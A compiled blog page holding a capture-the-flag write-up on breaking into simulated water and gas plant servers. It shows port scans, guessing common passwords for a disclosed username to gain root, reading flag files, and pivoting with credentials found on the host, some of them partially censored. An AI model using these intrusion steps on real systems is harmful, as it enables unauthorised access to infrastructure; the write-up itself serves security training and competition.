import{_ as e}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as n,b as a,o as i}from"./app-C96n2heI.js";const t="/TheRedCube-Blog/assets/network_overview-ClSJTcdq.png",p="/TheRedCube-Blog/assets/dashboard_water-BqV1Ix7D.png",l="/TheRedCube-Blog/assets/username_disclosure-DybWX6-h.png",o="/TheRedCube-Blog/assets/swat_flags-D-MdvwVk.png",r="/TheRedCube-Blog/assets/gasp_flags-DNFr6lBw.txt",c={};function d(h,s){return i(),n("div",null,s[0]||(s[0]=[a('<h1 id="ciss-2025-swat-gasp" tabindex="-1"><a class="header-anchor" href="#ciss-2025-swat-gasp"><span>CISS 2025 - SWat &amp; GASP</span></a></h1><p>Before starting with the technical details of how both the SWaT and GASP servers were compromised, we&#39;d like to give a short explanation of what these two systems are and why there is only one writeup for both the water and gas/fire categories of the CTF.</p><p>SWaT is a simulated water purification plant and GASP is a simulated gas compression plant. Both servers host an HMI that can be accessed via browser on port 3000 which is designed to both display the status of connected devices and output flags when tasks are completed.</p><p>The way GASP was solved fully depends on information only obtainable after hacking into SWaT. Because of this it makes little sense to write separate writeups for each, hence they have been combined into one.</p><p>We do not know whether the path we took was actually intended, but we <em>did</em> contact support after compromising SWaT. Since they permitted us to continue, we do assume this is an intended solution. And while one might not learn many OT specific hacking tricks by reading the below text, it shows very well that an attacker will always take the path of least resistance. ;D</p><h2 id="access-to-the-targets" tabindex="-1"><a class="header-anchor" href="#access-to-the-targets"><span>Access to the Targets</span></a></h2><p>The CISS had a slightly different method of access to the challenge machines than one would have suspected. In order to reach the target system, each team got a shared SSH user on both a jump host and a Kali VM within the network. While the full network was larger then what is shown here, the below diagram gives a short overview of the relevant machines.</p><figure><img src="'+t+`" alt="Network Overview" tabindex="0" loading="lazy"><figcaption>Network Overview</figcaption></figure><h2 id="enumeration" tabindex="-1"><a class="header-anchor" href="#enumeration"><span>Enumeration</span></a></h2><p>As the typical first step, both servers&#39; ports were scanned.</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> nmap</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -A</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> -</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -T</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 4</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -Pn</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 200.200.200.100</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">tee</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> swat_nmap.log</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> nmap</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -A</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> -</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -T</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 4</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -Pn</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 200.200.200.120</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">tee</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> gasp_nmap.log</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>From the scan results, we identified the following services:</p><ul><li><p>On SWaT, the exposed services were SSH, a web interface on port 3000, a MySQL database, an InfluxDB instance and 67 open ZeroMQ ports. There were some additional unidentifiable ports, but they have not been inspected in more detail since the server was rooted before that became necessary.</p></li><li><p>For GASP the setup was similar but there was no SSH service. Additionally, it hosted a Uvicorn API over port 8000.</p></li></ul><p>Enumeration continued with the web interface on port 3000. To make it a little easier to access, that port was forwarded to the attackers own machine.</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ssh</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -L</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 3000:200.200.200.100:3000</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -i</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ciss</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -p</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 4637</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -J</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> cissrt37@users.ncl.sg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> cissrt37@x3550.ddns.comp.nus.edu.sg</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>This allowed it to open the HMI interface with Burpsuite by visiting <code>localhost:3000</code>.</p><figure><img src="`+p+'" alt="SWaT Dashboard" tabindex="0" loading="lazy"><figcaption>SWaT Dashboard</figcaption></figure><p>The panel did specify to be in &quot;<em>Control</em>&quot; mode, but any web requests that attempted to make changes were blocked by the server. It was confirmed with CISS staff that this behavior is intended.</p><p>Reading through the frontend&#39;s source code, we eventually found an absolute Unix file path containing the username <code>student</code>. This single piece of information is our foothold.</p><figure><img src="'+l+`" alt="Username Disclosure" tabindex="0" loading="lazy"><figcaption>Username Disclosure</figcaption></figure><h2 id="compromising-swat" tabindex="-1"><a class="header-anchor" href="#compromising-swat"><span>Compromising SWaT</span></a></h2><p>Normally, finding just a username with no password or key file attached is not too useful since usernames are not supposed to be secret information and should be properly protected by the credentials that are set for them. However, since the discovered username is a Unix user and SSH is available to the target, it qualified for some default checks. When running those, we did not expect much from it, but it did end up giving us root access to the SWaT server.</p><p>A valuable lesson learned from that success is that it should never be <em>assumed</em> something would not work without actually having tested it.</p><p>The mentioned checks include testing the most common passwords. Personally, I like to use the first ten passwords from <code>rockyou.txt</code>, but another decent idea would be to look up the most used passwords of the current year.</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">head</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -n</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 10</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /usr/share/seclists/Passwords/Leaked-Databases/rockyou-05.txt</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>As it turns out, the password for the user <code>student</code> is <code>abc123</code>. Huh.</p><p>On top of that, <code>student</code> also has full sudo permissions on the target. Huh 2x.</p><div class="language-txt line-numbers-mode" data-highlighter="shiki" data-ext="txt" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-txt"><span class="line"><span>cissrt37@ciss-tx:~$ ssh student@200.200.200.100</span></span>
<span class="line"><span>student@200.200.200.100&#39;s password:</span></span>
<span class="line"><span>Welcome to Ubuntu 23.04 (GNU/Linux 6.2.0-39-generic x86_64)</span></span>
<span class="line"><span></span></span>
<span class="line"><span> * Documentation:  https://help.ubuntu.com</span></span>
<span class="line"><span> * Management:     https://landscape.canonical.com</span></span>
<span class="line"><span> * Support:        https://ubuntu.com/pro</span></span>
<span class="line"><span></span></span>
<span class="line"><span>0 updates can be applied immediately.</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>The list of available updates is more than a week old.</span></span>
<span class="line"><span>To check for new updates run: sudo apt update</span></span>
<span class="line"><span>Last login: Wed Jul 30 17:01:10 2025 from 200.200.200.1</span></span>
<span class="line"><span>student@ciss-swatvm:~$ id</span></span>
<span class="line"><span>uid=1000(student) gid=1000(student) groups=1000(student),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),118(lpadmin)</span></span>
<span class="line"><span>student@ciss-swatvm:~$ sudo -l</span></span>
<span class="line"><span>[sudo] password for student: </span></span>
<span class="line"><span>Matching Defaults entries for student on ciss-swatvm:</span></span>
<span class="line"><span>    env_reset, mail_badpass,</span></span>
<span class="line"><span>    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty</span></span>
<span class="line"><span></span></span>
<span class="line"><span>User student may run the following commands on ciss-swatvm:</span></span>
<span class="line"><span>    (ALL : ALL) ALL</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>And just like that, the reward for reading JavaScript for 3 hours is full root access to the target server. A directory listing shows a file called <code>flag_publish.py</code>. Printing the contents of this file reveals 5 different flags for the SWaT category including some comments to let you know which flag is for what question.</p><div class="language-txt line-numbers-mode" data-highlighter="shiki" data-ext="txt" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-txt"><span class="line"><span>student@ciss-swatvm:~$ ls</span></span>
<span class="line"><span>CISS24_SWaT_HMI-main  kill_all_scripts.sh  start_cd_web_hmi.sh     start_web_hmi.sh</span></span>
<span class="line"><span>ciss_swat.sh          ncl.txt              start_flag_script.sh    test_run.sh</span></span>
<span class="line"><span>flag_publish.py       nohup.out            start_gnome_web_hmi.sh  thinclient_drives</span></span>
<span class="line"><span>guru_twin             run_all_scripts.sh   start_historian.sh</span></span>
<span class="line"><span>instructions.txt      snap                 start_swat_twin.sh</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="`+o+`" alt="SWaT Flags" tabindex="0" loading="lazy"><figcaption>SWaT Flags</figcaption></figure><p>It is important to note that the values that are commented out <strong>do not work</strong> and there are in fact two challenges for SWaT that either have no flag attached or have it hidden in a different location.</p><h2 id="pivoting-for-the-gasp-source-code" tabindex="-1"><a class="header-anchor" href="#pivoting-for-the-gasp-source-code"><span>Pivoting for the GASP Source Code</span></a></h2><p>Still on the SWaT server, we also discovered a file called <code>~/ncl.txt</code>. Said file contains the instructions and credentials to a secondary jumphost and SSH server.</p><p>Since the credentials have not been revoked at the time of me writing this and it is unknown whether access to this secondary system is still wanted, the credentials have been partially censored here. It is recommended to run the SSH command from the attacker&#39;s own machine instead of the provided shared system, as adding another two SSH connections to the chain <em>might</em> have a negative impact on the connection. ;D</p><div class="language-txt line-numbers-mode" data-highlighter="shiki" data-ext="txt" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-txt"><span class="line"><span>student@ciss-swatvm:~$ cat ncl.txt </span></span>
<span class="line"><span>ssh -p 4506 -J ncl_intern@gateway.ncl.sg ncl@172.18.178.17</span></span>
<span class="line"><span></span></span>
<span class="line"><span>�  ncl_intern/i████████████2</span></span>
<span class="line"><span>�  ncl/9████████████U</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Unfortunately, executing the above command did not work as expected. Port <code>4506</code> appeared to be either closed or blocked by a firewall. To get a better understanding of what was going on, we connected to the jumphost directly and ran a port scan against the internal IP <code>172.18.178.17</code>. This revealed <em>a lot</em> of available SSH ports.</p><div class="language-txt line-numbers-mode" data-highlighter="shiki" data-ext="txt" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-txt"><span class="line"><span>ncl_intern@gateway:~$ nmap -sC -sV -p - -T 4 -Pn 172.18.178.17</span></span>
<span class="line"><span>[...]</span></span>
<span class="line"><span>PORT     STATE  SERVICE        VERSION</span></span>
<span class="line"><span>22/tcp   open   ssh            OpenSSH 9.4 (protocol 2.0)</span></span>
<span class="line"><span>53/tcp   open   domain         (generic dns response: NOTIMP)</span></span>
<span class="line"><span>113/tcp  closed ident</span></span>
<span class="line"><span>443/tcp  open   ssl/http       nginx</span></span>
<span class="line"><span>| http-cookie-flags: </span></span>
<span class="line"><span>|   /: </span></span>
<span class="line"><span>|     PHPSESSID: </span></span>
<span class="line"><span>|_      httponly flag not set</span></span>
<span class="line"><span>|_http-title: Error</span></span>
<span class="line"><span>| ssl-cert: Subject: commonName=*.ncl.sg</span></span>
<span class="line"><span>| Subject Alternative Name: DNS:*.ncl.sg, DNS:ncl.sg</span></span>
<span class="line"><span>| Not valid before: 2025-05-09T00:00:00</span></span>
<span class="line"><span>|_Not valid after:  2026-05-28T23:59:59</span></span>
<span class="line"><span>| tls-alpn: </span></span>
<span class="line"><span>|   h2</span></span>
<span class="line"><span>|_  http/1.1</span></span>
<span class="line"><span>1194/tcp open   openvpn?</span></span>
<span class="line"><span>2000/tcp open   cisco-sccp?</span></span>
<span class="line"><span>4204/tcp open   ssh            OpenSSH 9.7p1 Debian 7 (protocol 2.0)</span></span>
<span class="line"><span>4205/tcp open   ssh            OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)</span></span>
<span class="line"><span>4206/tcp open   ssh            OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)</span></span>
<span class="line"><span>4207/tcp open   ssh            OpenSSH 9.7p1 Debian 7 (protocol 2.0)</span></span>
<span class="line"><span>4208/tcp open   ssh            OpenSSH 9.7p1 Debian 7 (protocol 2.0)</span></span>
<span class="line"><span>4680/tcp open   ssh            OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)</span></span>
<span class="line"><span>4681/tcp open   ssh            OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)</span></span>
<span class="line"><span>4682/tcp open   ssh            OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)</span></span>
<span class="line"><span>4683/tcp open   spike?</span></span>
<span class="line"><span>4684/tcp open   rfid-rp1?</span></span>
<span class="line"><span>4685/tcp open   tcpwrapped</span></span>
<span class="line"><span>4687/tcp open   ssh            OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)</span></span>
<span class="line"><span>4688/tcp open   mobile-p2p?</span></span>
<span class="line"><span>4689/tcp open   altovacentral?</span></span>
<span class="line"><span>4690/tcp open   prelude?</span></span>
<span class="line"><span>4696/tcp open   ssh            OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)</span></span>
<span class="line"><span>4697/tcp open   ssh            OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)</span></span>
<span class="line"><span>4701/tcp open   ssh            OpenSSH 9.7p1 Debian 7 (protocol 2.0)</span></span>
<span class="line"><span>4702/tcp open   ssh            OpenSSH 9.7p1 Debian 7 (protocol 2.0)</span></span>
<span class="line"><span>4703/tcp open   ssh            OpenSSH 9.7p1 Debian 7 (protocol 2.0)</span></span>
<span class="line"><span>4704/tcp open   ssh            OpenSSH 9.7p1 Debian 7 (protocol 2.0)</span></span>
<span class="line"><span>4705/tcp open   ssh            OpenSSH 9.7p1 Debian 7 (protocol 2.0)</span></span>
<span class="line"><span>4706/tcp open   ssh            OpenSSH 9.7p1 Debian 7 (protocol 2.0)</span></span>
<span class="line"><span>4707/tcp open   ssh            OpenSSH 9.7p1 Debian 7 (protocol 2.0)</span></span>
<span class="line"><span>4708/tcp open   ssh            OpenSSH 9.7p1 Debian 7 (protocol 2.0)</span></span>
<span class="line"><span>4709/tcp open   ssh            OpenSSH 9.7p1 Debian 7 (protocol 2.0)</span></span>
<span class="line"><span>4710/tcp open   ssh            OpenSSH 9.7p1 Debian 7 (protocol 2.0)</span></span>
<span class="line"><span>4711/tcp open   ssh            OpenSSH 9.7p1 Debian 7 (protocol 2.0)</span></span>
<span class="line"><span>4712/tcp open   ssh            OpenSSH 9.7p1 Debian 7 (protocol 2.0)</span></span>
<span class="line"><span>4713/tcp open   ssh            OpenSSH 9.7p1 Debian 7 (protocol 2.0)</span></span>
<span class="line"><span>4714/tcp open   ssh            OpenSSH 9.7p1 Debian 7 (protocol 2.0)</span></span>
<span class="line"><span>4715/tcp open   ssh            OpenSSH 9.7p1 Debian 7 (protocol 2.0)</span></span>
<span class="line"><span>4716/tcp open   ssh            OpenSSH 9.7p1 Debian 7 (protocol 2.0)</span></span>
<span class="line"><span>4717/tcp open   ssh            OpenSSH 9.7p1 Debian 7 (protocol 2.0)</span></span>
<span class="line"><span>4718/tcp open   ssh            OpenSSH 9.7p1 Debian 7 (protocol 2.0)</span></span>
<span class="line"><span>4825/tcp open   ssh            OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span></span>
<span class="line"><span>4826/tcp open   ssh            OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span></span>
<span class="line"><span>4845/tcp open   ssh            OpenSSH 9.7p1 Debian 7 (protocol 2.0)</span></span>
<span class="line"><span>4846/tcp open   ssh            OpenSSH 9.7p1 Debian 7 (protocol 2.0)</span></span>
<span class="line"><span>4847/tcp open   ssh            OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span></span>
<span class="line"><span>4869/tcp open   ssh            OpenSSH 9.7p1 Debian 7 (protocol 2.0)</span></span>
<span class="line"><span>4871/tcp open   ssh            OpenSSH 9.7p1 Debian 7 (protocol 2.0)</span></span>
<span class="line"><span>4872/tcp open   ssh            OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)</span></span>
<span class="line"><span>5060/tcp open   sip?</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Attempting to connect to each port using the credentials for the user <code>ncl</code> provides shell access through port <code>4204</code>.</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ssh</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ncl@172.18.178.17</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -p</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 4204</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>And voilá, there is another file called <code>flag_publish_gasp_v2.py</code> stored in the users home directory.</p><div class="language-txt line-numbers-mode" data-highlighter="shiki" data-ext="txt" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-txt"><span class="line"><span>ncl@ciss-tx:~$ ls</span></span>
<span class="line"><span>Desktop    Downloads           Music      Pictures  Templates  __pycache__              monitorAgent</span></span>
<span class="line"><span>Documents  FloatingButtons.js  NavBar.js  Public    Videos     flag_publish_gasp_v2.py  superinit.py</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>This time, there are <em>all</em> the flags for the offensive GASP challenges contained within.</p><figure><img src="`+r+'" alt="GASP Flags" tabindex="0" loading="lazy"><figcaption>GASP Flags</figcaption></figure><h2 id="afterword" tabindex="-1"><a class="header-anchor" href="#afterword"><span>Afterword</span></a></h2><p>While this exploit path effectively allowed us to take first place, we are still uncertain whether it was actually intended. In case you are wondering, we know that, for at least SWaT, the challenges can be solved using the OPCAU protocol as well.</p><p>Both the servers also contained a bunch of rabbit holes like:</p><ul><li>A MySQL database with really weak credentials that can be found in the applications source code</li><li>An IngresDB instance that allows you to create your own user and is vulnerable to a CVE that allows you to dump other users&#39; access tokens (there are none)</li><li>And an Uvicorn API with a single POST endpoint that simply echoes the request body.</li></ul><p>There is potential that all of these services can also lead to a solution, but since a simpler method was discovered, we did not spend too much time testing them.</p>',49)]))}const b=e(c,[["render",d]]),v=JSON.parse(`{"path":"/posts/CISS/SWaT_and_GASP.html","title":"SWaT and GASP","lang":"en-US","frontmatter":{"date":"2025-07-31T00:00:00.000Z","author":"Thomas Gingele","article":false,"title":"SWaT and GASP","cover":"/assets/images/2025-CISS.png","description":"CISS 2025 - SWat & GASP Before starting with the technical details of how both the SWaT and GASP servers were compromised, we'd like to give a short explanation of what these tw...","head":[["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"WebPage\\",\\"name\\":\\"SWaT and GASP\\",\\"description\\":\\"CISS 2025 - SWat & GASP Before starting with the technical details of how both the SWaT and GASP servers were compromised, we'd like to give a short explanation of what these tw...\\"}"],["meta",{"property":"og:url","content":"https://hm-seclab.github.io/TheRedCube-Blog/posts/CISS/SWaT_and_GASP.html"}],["meta",{"property":"og:site_name","content":"TheRedCube"}],["meta",{"property":"og:title","content":"SWaT and GASP"}],["meta",{"property":"og:description","content":"CISS 2025 - SWat & GASP Before starting with the technical details of how both the SWaT and GASP servers were compromised, we'd like to give a short explanation of what these tw..."}],["meta",{"property":"og:type","content":"website"}],["meta",{"property":"og:image","content":"https://hm-seclab.github.io/TheRedCube-Blog/assets/images/2025-CISS.png"}],["meta",{"property":"og:locale","content":"en-US"}],["meta",{"property":"og:updated_time","content":"2025-08-04T08:46:06.000Z"}],["meta",{"name":"twitter:card","content":"summary_large_image"}],["meta",{"name":"twitter:image:src","content":"https://hm-seclab.github.io/TheRedCube-Blog/assets/images/2025-CISS.png"}],["meta",{"name":"twitter:image:alt","content":"SWaT and GASP"}],["meta",{"property":"article:author","content":"Thomas Gingele"}],["meta",{"property":"article:published_time","content":"2025-07-31T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2025-08-04T08:46:06.000Z"}]]},"git":{"createdTime":1754251538000,"updatedTime":1754297166000,"contributors":[{"name":"Thomas Gingele","username":"","email":"b1tc0r3@proton.me","commits":1},{"name":"mbiebel","username":"mbiebel","email":"mariuxdeangelo@outlook.com","commits":1,"url":"https://github.com/mbiebel"}]},"readingTime":{"minutes":6.04,"words":1812},"filePathRelative":"posts/CISS/SWaT_and_GASP.md","excerpt":"\\n<p>Before starting with the technical details of how both the SWaT and GASP servers were compromised, we'd like to give a short explanation of what these two systems are and\\nwhy there is only one writeup for both the water and gas/fire categories of the CTF.</p>\\n<p>SWaT is a simulated water purification plant and GASP is a simulated gas compression plant.\\nBoth servers host an HMI that can be accessed via browser on port 3000 which is designed to both display the status of connected devices and output flags when tasks are completed.</p>","autoDesc":true}`);export{b as comp,v as data};
